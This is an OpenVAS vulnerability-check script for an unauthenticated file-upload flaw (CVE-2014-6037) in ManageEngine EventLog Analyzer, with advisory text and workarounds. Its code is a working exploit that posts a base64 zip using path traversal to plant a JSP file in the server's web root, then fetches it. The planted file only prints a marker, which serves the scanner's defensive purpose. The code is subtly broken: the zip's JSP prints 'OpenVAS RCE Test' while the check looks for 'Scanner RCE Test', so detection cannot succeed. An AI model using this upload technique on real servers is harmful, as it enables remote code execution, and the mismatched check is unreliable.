###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_manageengine_eventlog_analyzer_69482.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# ManageEngine EventLog Analyzer Multiple Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:zohocorp:manageengine_eventlog_analyzer';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105083");
  script_bugtraq_id(69482);
  script_cve_id("CVE-2014-6037");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("$Revision: 13659 $");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("ManageEngine EventLog Analyzer Multiple Security Vulnerabilities");

  script_xref(name:"URL", value:"http://www.manageengine.com/products/eventlog/");
  script_xref(name:"URL", value:"https://www.mogwaisecurity.de/advisories/MSA-2014-01.txt");

  script_tag(name:"impact", value:"Attackers can exploit these issues to execute arbitrary code and gain
unauthorized access to the critical sections of the application.");

  script_tag(name:"vuldetect", value:"Upload a special crafted zip file and check if /openvas.jsp exist afterwards and contains an expected string.");

  script_tag(name:"insight", value:"1)Unauthenticated remote code execution
ME EventLog Analyzer contains a 'agentUpload' servlet which is used by Agents
to send log data as zip files to the central server. Files can be uploaded
without authentication and are stored/decompressed in the 'data' subdirectory.

As the decompress procedure is handling the file names in the ZIP file in a
insecure way it is possible to store files in the web root of server. This can
be used to upload/execute code with the rights of the application server.

2) Authorization issues
The EventLog Analyzer web interface does not check if an authenticated has
sufficient permissions to access certain parts of the application. A low
privileged user (for example guest) can therefore access critical sections of the web
interface, by directly calling the corresponding URLs. This can be used to access the
database browser of the application which gives the attacker full access to the database.");

  script_tag(name:"solution", value:"Ask the Vendor for an update. Workaround:

1) Unauthenticated remote code execution

If agents are not used to collect log information, access to the servlet can be disabled by commenting out the
following lines in the web.xml file (webapps/event/WEB-INF/web.xml) and restart the service.

<servlet>
        <servlet-name>agentUpload</servlet-name>
        <servlet-class>com.adventnet.sa.agent.UploadHandlerServlet</servlet-class>
</servlet>
<servlet-mapping>
        <servlet-name>agentUpload</servlet-name>
        <url-pattern>/agentUpload</url-pattern>
</servlet-mapping>


2) Authorization issues

No workaround, reduce the attack surface by disabling unused low privileged accounts like 'guest'.");

  script_tag(name:"summary", value:"ManageEngine EventLog Analyzer is prone to an arbitrary file-upload
vulnerability and an unauthorized-access vulnerability.");

  script_tag(name:"affected", value:"EventLog Analyzer 9.9 Build 9002 and prior are vulnerable.");

  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2014-09-09 12:16:43 +0200 (Tue, 09 Sep 2014)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("gb_manageengine_eventlog_analyzer_detect.nasl");
  script_mandatory_keys("me_eventlog_analyzer/installed");
  script_require_ports("Services/www", 8400);

  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

useragent = http_get_user_agent();
host = http_host_name(port: port);

function _send( data )
{
  if( ! data ) return;

  data =  base64_decode( str:data );

  ex = '\r\n' +
       '------------------------------d781b0329289\r\n' +
       'Content-Disposition: form-data; name="payload"; filename="evil.zip"\r\n' +
       'Content-Type: application/octet-stream\r\n' +
       '\r\n' +
       data +
       '\r\n' +
       '------------------------------d781b0329289--';

len = strlen( ex );

req = 'POST /agentUpload HTTP/1.1\r\n' +
      'User-Agent: ' + useragent + '\r\n' +
      'Host: ' + host + '\r\n' +
      'Accept: */*\r\n' +
      'Content-Length: ' + len + '\r\n' +
      'Expect: 100-continue\r\n' +
      'Content-Type: multipart/form-data; boundary=----------------------------d781b0329289\r\n' +
      ex;

     result = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

     if( ! result ) return;

     return result;
}

# evil.zip -> openvas.jsp -> <%= new String("Scanner RCE Test") %>
zip        = 'UEsDBBQAAAAAADZcKUVt2hsLJgAAACYAAAAfAAAALi4vLi4vd2ViYXBwcy9ldmVudC9vcGVudmFzLmpzcDwlP' +
             'SBuZXcgU3RyaW5nKCJPcGVuVkFTIFJDRSBUZXN0IikgJT4KUEsBAhQDFAAAAAAANlwpRW3aGwsmAAAAJgAAAB' +
             '8AAAAAAAAAAAAAAKSBAAAAAC4uLy4uL3dlYmFwcHMvZXZlbnQvb3BlbnZhcy5qc3BQSwUGAAAAAAEAAQBNAAA' +
             'AYwAAAAAA';
# evil.zip -> openvas.jsp -> -
zip_clean = 'UEsDBBQAAAAAAFpdKUWQvFEqKgAAACoAAAAfAAAALi4vLi4vd2ViYXBwcy9ldmVudC9vcGVudmFz' +
            'LmpzcDwlPSBuZXcgU3RyaW5nKCJPcGVuVkFTIFRFU1QgRk9SIFJDRSIpICU+ClBLAwQUAAAAAACN' +
            'ZSlFDqEmgQIAAAACAAAAHwAAAC4uLy4uL3dlYmFwcHMvZXZlbnQvb3BlbnZhcy5qc3AtClBLAQIU' +
            'AxQAAAAAAFpdKUWQvFEqKgAAACoAAAAfAAAAAAAAAAAAAACkgQAAAAAuLi8uLi93ZWJhcHBzL2V2' +
            'ZW50L29wZW52YXMuanNwUEsBAhQDFAAAAAAAjWUpRQ6hJoECAAAAAgAAAB8AAAAAAAAAAAAAAKSB' +
            'ZwAAAC4uLy4uL3dlYmFwcHMvZXZlbnQvb3BlbnZhcy5qc3BQSwUGAAAAAAIAAgCaAAAApgAAAAAA';

buf = _send( data:zip );
if( isnull( buf ) ) exit( 99 );

url = "/openvas.jsp";
req = http_get( item:url, port:port );
buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

if( "Scanner RCE Test" >< buf )
{
  report = 'By uploading a special crafted zip file, the file "/openvas.jsp" was created. Please delete this file.';
  security_message( port:port, data:report );
  _send( data:zip_clean );
  exit( 0 );
}

exit( 99 );
